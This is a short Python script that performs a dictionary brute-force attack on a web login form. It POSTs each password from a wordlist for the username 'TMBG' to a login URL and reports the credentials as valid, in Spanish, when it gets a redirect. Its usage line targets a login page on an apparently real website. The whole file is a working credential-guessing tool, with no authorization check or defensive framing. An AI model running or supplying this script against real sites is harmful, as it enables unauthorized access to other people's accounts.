#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Usage: python brute-force-dictionary.py --dictionary wordlist.txt --url http://www.query2d.com/es-pe/Account/Login

#import the necessary packages
import argparse
import json
import requests

# construct the argument parse and parse the arguments
arguments = argparse.ArgumentParser()
arguments.add_argument("-d", "--dictionary", required=True,
    help="Path to the dictionary")

arguments.add_argument("-u", "--url", required=True,
    help="Url ")


args = vars(arguments.parse_args())

wordlist = open(args["dictionary"])

#
for word in wordlist.readlines():

    # headers = {'content-type': 'application/json'}
    # headers = {'content-type': 'text/html; charset=utf-8'}
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    url = args["url"]

    payload = {
        'UserName': 'TMBG',
        'Password': word.strip("\n")
    }

    r = requests.post(url, data=payload, headers=headers)
    print "[INFO] \n\n"
    print r.status_code
    print "\n\n"
    print r.headers

    if r.status_code in [301, 302]:
        print "Las credenciales: TMBG y %s son validas" %(word.strip("\n"))
        break
    else:
        print "Las credenciales: TMBG y %s son invalidas" %(word.strip("\n"))
